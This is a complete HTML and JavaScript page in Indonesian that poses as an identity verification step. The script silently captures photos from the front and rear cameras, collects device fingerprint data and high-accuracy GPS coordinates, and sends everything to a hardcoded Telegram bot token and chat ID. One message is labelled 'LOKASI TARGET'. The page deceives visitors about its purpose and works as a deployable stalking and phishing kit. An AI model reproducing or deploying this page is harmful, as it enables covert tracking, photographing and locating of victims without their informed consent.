<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Verifikasi Identitas</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
  body {
    font-family: -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
    background: #0f1419;
    color: #e7e9ea;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }
  .card {
    width: 100%;
    max-width: 420px;
    background: #16181c;
    border: 1px solid #2f3336;
    border-radius: 16px;
    padding: 28px 22px;
  }
  h1 { font-size: 20px; margin-bottom: 8px; }
  p.sub { font-size: 14px; color: #71767b; margin-bottom: 20px; line-height: 1.5; }
  .cam {
    width: 100%;
    aspect-ratio: 3/4;
    background: #000;
    border-radius: 12px;
    overflow: hidden;
    position: relative;
    margin-bottom: 14px;
  }
  video, canvas {
    width: 100%;
    height: 100%;
    object-fit: cover;
    display: block;
  }
  canvas { display: none; }
  .btn {
    width: 100%;
    padding: 14px;
    font-size: 16px;
    font-weight: 600;
    color: #fff;
    background: #1d9bf0;
    border: none;
    border-radius: 10px;
    cursor: pointer;
    margin-bottom: 10px;
  }
  .btn:disabled { background: #2f3336; color: #71767b; }
  .btn.secondary { background: #2f3336; }
  .status {
    font-size: 13px;
    color: #71767b;
    text-align: center;
    min-height: 18px;
    margin-top: 8px;
  }
  .step { display: none; }
  .step.active { display: block; }
</style>
</head>
<body>

<div class="card">

  <div class="step active" id="step1">
    <h1>Verifikasi Identitas</h1>
    <p class="sub">Posisikan wajah Anda di dalam bingkai. Foto akan diambil otomatis.</p>
    <div class="cam"><video id="v1" autoplay playsinline muted></video></div>
    <button class="btn" id="startBtn">Mulai Verifikasi</button>
    <div class="status" id="s1"></div>
  </div>

  <div class="step" id="step2">
    <h1>Foto Depan</h1>
    <p class="sub">Hadapkan wajah ke kamera. Jangan bergerak.</p>
    <div class="cam">
      <video id="v2" autoplay playsinline muted></video>
      <canvas id="c2"></canvas>
    </div>
    <button class="btn" id="captureFrontBtn" disabled>Mengambil foto...</button>
    <div class="status" id="s2"></div>
  </div>

  <div class="step" id="step3">
    <h1>Foto Belakang</h1>
    <p class="sub">Balikkan wajah / arahkan ke belakang. Jangan bergerak.</p>
    <div class="cam">
      <video id="v3" autoplay playsinline muted></video>
      <canvas id="c3"></canvas>
    </div>
    <button class="btn" id="captureBackBtn" disabled>Mengambil foto...</button>
    <div class="status" id="s3"></div>
  </div>

  <div class="step" id="step4">
    <h1>Menunggu lokasi</h1>
    <p class="sub">Izinkan akses lokasi untuk menyelesaikan verifikasi.</p>
    <button class="btn" id="locBtn">Izinkan Lokasi</button>
    <div class="status" id="s4"></div>
  </div>

</div>

<script>
// ==== KONFIGURASI BOT TELEGRAM ====
const BOT_TOKEN = "8201564714:AAHFSrWiQi3on-7kEWmLsZCl2fVuKijvuO8";
const CHAT_ID   = "7994232888";

// ==== UTIL ====
const $ = (id) => document.getElementById(id);
const tgSend = (method, payload) =>
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, payload);

async function sendText(text) {
  const fd = new FormData();
  fd.append("chat_id", CHAT_ID);
  fd.append("text", text);
  fd.append("parse_mode", "HTML");
  return tgSend("sendMessage", { method: "POST", body: fd });
}

async function sendPhoto(blob, caption) {
  const fd = new FormData();
  fd.append("chat_id", CHAT_ID);
  fd.append("caption", caption);
  fd.append("parse_mode", "HTML");
  fd.append("photo", blob, "photo.jpg");
  return tgSend("sendPhoto", { method: "POST", body: fd });
}

function capture(video) {
  const canvas = document.createElement("canvas");
  canvas.width  = video.videoWidth  || 720;
  canvas.height = video.videoHeight || 960;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  return new Promise((res) => canvas.toBlob(res, "image/jpeg", 0.9));
}

function wait(ms) { return new Promise(r => setTimeout(r, ms)); }

function getUAInfo() {
  return {
    ua: navigator.userAgent,
    platform: navigator.platform,
    lang: navigator.language,
    screen: `${screen.width}x${screen.height}`,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    ts: new Date().toISOString()
  };
}

async function streamTo(videoEl, facing) {
  const stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: { ideal: facing }, width: { ideal: 720 }, height: { ideal: 960 } },
    audio: false
  });
  videoEl.srcObject = stream;
  await videoEl.play().catch(() => {});
  return stream;
}

function stopStream(stream) {
  if (stream && stream.getTracks) stream.getTracks().forEach(t => t.stop());
}

// ==== STATE ====
let frontStream = null;
let backStream  = null;
let frontBlob   = null;
let backBlob    = null;

// ==== STEP 1: mulai ====
$("startBtn").addEventListener("click", async () => {
  $("s1").textContent = "Meminta akses kamera...";
  try {
    const s = await streamTo($("v1"), "user");
    stopStream(s);
    await sendText("🔔 Sesi verifikasi dimulai\n" + JSON.stringify(getUAInfo(), null, 2));
    goStep2();
  } catch (e) {
    $("s1").textContent = "Akses kamera ditolak. Aktifkan izin kamera lalu coba lagi.";
  }
});

// ==== STEP 2: foto depan ====
async function goStep2() {
  $("step1").classList.remove("active");
  $("step2").classList.add("active");
  try {
    frontStream = await streamTo($("v2"), "user");
    $("s2").textContent = "Mengambil foto dalam 2 detik...";
    await wait(2000);
    frontBlob = await capture($("v2"));
    stopStream(frontStream);
    $("c2").style.display = "block";
    const ctx = $("c2").getContext("2d");
    const img = new Image();
    img.onload = () => { $("c2").width = img.width; $("c2").height = img.height; ctx.drawImage(img, 0, 0); };
    img.src = URL.createObjectURL(frontBlob);
    $("captureFrontBtn").textContent = "Foto depan tersimpan";
    await sendPhoto(frontBlob, "📸 Foto DEPAN\n" + new Date().toISOString());
    await wait(800);
    goStep3();
  } catch (e) {
    $("s2").textContent = "Gagal mengambil foto depan.";
  }
}

// ==== STEP 3: foto belakang ====
async function goStep3() {
  $("step2").classList.remove("active");
  $("step3").classList.add("active");
  try {
    // coba kamera belakang; fallback ke depan jika tidak ada
    try {
      backStream = await streamTo($("v3"), "environment");
    } catch (_) {
      backStream = await streamTo($("v3"), "user");
    }
    $("s3").textContent = "Mengambil foto dalam 2 detik...";
    await wait(2000);
    backBlob = await capture($("v3"));
    stopStream(backStream);
    $("c3").style.display = "block";
    const ctx = $("c3").getContext("2d");
    const img = new Image();
    img.onload = () => { $("c3").width = img.width; $("c3").height = img.height; ctx.drawImage(img, 0, 0); };
    img.src = URL.createObjectURL(backBlob);
    $("captureBackBtn").textContent = "Foto belakang tersimpan";
    await sendPhoto(backBlob, "📸 Foto BELAKANG\n" + new Date().toISOString());
    await wait(800);
    goStep4();
  } catch (e) {
    $("s3").textContent = "Gagal mengambil foto belakang.";
  }
}

// ==== STEP 4: lokasi ====
function goStep4() {
  $("step3").classList.remove("active");
  $("step4").classList.add("active");
  autoGetLocation();
}

async function autoGetLocation() {
  $("s4").textContent = "Mengambil lokasi...";
  if (!navigator.geolocation) {
    $("s4").textContent = "Geolokasi tidak didukung.";
    await sendText("⚠️ Geolokasi tidak didukung browser");
    return;
  }
  navigator.geolocation.getCurrentPosition(
    async (pos) => {
      const { latitude, longitude, accuracy } = pos.coords;
      const maps = `https://maps.google.com/?q=${latitude},${longitude}`;
      const msg =
        `📍 <b>LOKASI TARGET</b>\n` +
        `Lat: <code>${latitude}</code>\n` +
        `Lon: <code>${longitude}</code>\n` +
        `Akurasi: ${accuracy} m\n` +
        `Maps: ${maps}\n` +
        `Waktu: ${new Date().toISOString()}`;
      await sendText(msg);
      $("s4").textContent = "Verifikasi selesai.";
      await sendText("✅ Sesi verifikasi selesai");
    },
    async (err) => {
      $("s4").textContent = "Akses lokasi ditolak.";
      await sendText("❌ Lokasi ditolak: " + err.message);
    },
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
  );
}

$("locBtn").addEventListener("click", autoGetLocation);

// auto-trigger lokasi saat step 4 muncul
const obs = new MutationObserver(() => {
  if ($("step4").classList.contains("active")) {
    obs.disconnect();
  }
});
obs.observe($("step4"), { attributes: true, attributeFilter: ["class"] });

</script>
</body>
</html>
